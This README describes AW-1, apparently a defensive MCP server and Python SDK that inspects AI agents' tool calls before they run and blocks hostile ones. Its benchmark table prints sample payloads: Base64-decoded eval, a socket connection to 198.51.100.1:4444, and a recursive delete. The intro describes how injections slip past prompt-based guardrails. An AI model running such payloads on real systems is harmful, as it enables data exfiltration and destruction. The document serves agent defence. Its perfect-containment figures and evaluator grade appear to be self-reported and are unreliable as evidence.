# AW-1 Circuit Breaker

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Python: 3.10+](https://img.shields.io/badge/python-3.10+-brightgreen.svg)](https://python.org)
[![MCP Version: 2024-11-05](https://img.shields.io/badge/MCP-2024--11--05-blueviolet.svg)](https://modelcontextprotocol.io)
[![Evaluator Grade: AISI/METR A](https://img.shields.io/badge/Benchmark-AISI%2FMETR%20Grade%20A-success.svg)](#-adversarial-gauntlet-benchmark)

**Deterministic, out-of-band execution circuit breaker and Model Context Protocol (MCP) server for autonomous AI agents.**

Standard LLM guardrails (RLHF, system prompts, secondary evaluators) operate **in-band**: probabilistic models evaluating their own execution safety. When autonomous agents gain shell access, external tool execution, or financial disbursement rails, adversarial injections bypass prompt boundaries via Base64 steganography, dynamic , or velocity micro-drains.

**AW-1** enforces a deterministic, out-of-band proxy layer between the cognitive reasoning node and host execution sockets.

---

## ⚡ Key Highlights

- **Layer 0 AST Symbolic Unpacker:** Recursively decompiles tool payloads, Base64 strings, and dynamic calls into execution primitives (`[DYNAMIC_EVAL]`, `[NETWORK_EGRESS]`, `[EXEC_SHELL]`, `[DESTRUCTIVE_WRITE]`) in **<0.15 ms**.
- **Native MCP JSON-RPC 2.0 Server:** Out-of-the-box integration for Claude Desktop, Gemini Enterprise, Cursor, and custom agent swarms.
- **100% Adversarial Containment:** Validated across 1,000 cycles of the BRK Breakout Suite with **0.00% false positives** on benign traffic.
- **Zero Dependencies:** Pure standard-library Python (sub-millisecond fast path).
- **Statutory Non-Repudiation:** Cryptographically sealed JSON-LD dossiers anchored by SHA-256 digests.

---

## 📊 Adversarial Gauntlet Benchmark

Results from 1,000 automated attack cycles on the **BRK Breakout Suite** (`scripts/benchmark_mcp_breaker.py`):

| Test Suite | Attack Vector | Sample Payload | Verdict | Mean Latency |
| :--- | :--- | :--- | :---: | :---: |
| **BRK-101** | Base64 Steganography & `eval()` | `eval(compile(b64decode(...)))` | **HALT** | 0.128 ms |
| **BRK-102** | Covert TCP Socket Egress | `socket.connect(('198.51.100.1', 4444))` | **HALT** | 0.134 ms |
| **BRK-103** | Destructive Filesystem Tampering | `shutil.rmtree('/dossiers')` | **HALT** | 0.119 ms |
| **BRK-BENIGN**| Operational Escrow Lookup | `SELECT balance FROM trust_escrow` | **ALLOW** | 0.057 ms |

- **Containment Rate:** **100.00%** (745 / 745 attacks neutralized)
- **False Positive Rate:** **0.00%** (255 / 255 benign queries passed)
- **Mean Pre-Execution Overhead:** **0.142 ms**
- **Evaluation Grade:** `AISI_METR_COMPLIANT_GRADE_A`

---

## 🔌 Model Context Protocol (MCP) Server

AW-1 exposes standardized JSON-RPC tools for agent frameworks:

### Exposed MCP Tools:
1. `audit_agent_tool_call`: Pre-execution inspection decomposing tool payloads into AST primitives.
2. `verify_statutory_quota`: Botswana CEE Act 2021 (>= 50% citizen equity) and CEDA compliance checking.
3. `verify_cryptographic_seal`: Independent validation of Bank of Botswana 1-to-1 trust backing SHA-256 seals.

### Connecting via Claude Desktop / Cursor
Add to your `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "aw1-breaker": {
      "command": "python3",
      "args": ["/path/to/aw1-breaker/scripts/aw1_mcp_server.py"]
    }
  }
}
```

---

## 🚀 Quickstart (Python SDK)

```python
from aw1 import ExecutionBreaker

# Initialize out-of-band circuit breaker
breaker = ExecutionBreaker(baseline_velocity=50000.0)

# Intercept proposed agent action before execution
verdict = breaker.intercept(
    actor_id="agent_ops_01",
    tool_name="shell_exec",
    payload="import socket; s = socket.socket()"
)

if verdict["status"] == "HALT":
    raise PermissionError(f"Circuit Breaker Tripped: {verdict['reason']}")
```

---

## 📄 Research & Preprints

Full research specification and mathematical proofs:  
- **Preprint:** [`docs/AW1_TECHNICAL_SPEC_ARXIV.md`](docs/AW1_TECHNICAL_SPEC_ARXIV.md)  
- *Target Tracks:* arXiv:cs.AI | arXiv:cs.CR | AI Alignment Forum

---

## 📜 License

MIT License. Designed and maintained by **Laveto Wisdom Research Group** (`Laveto Labs`).
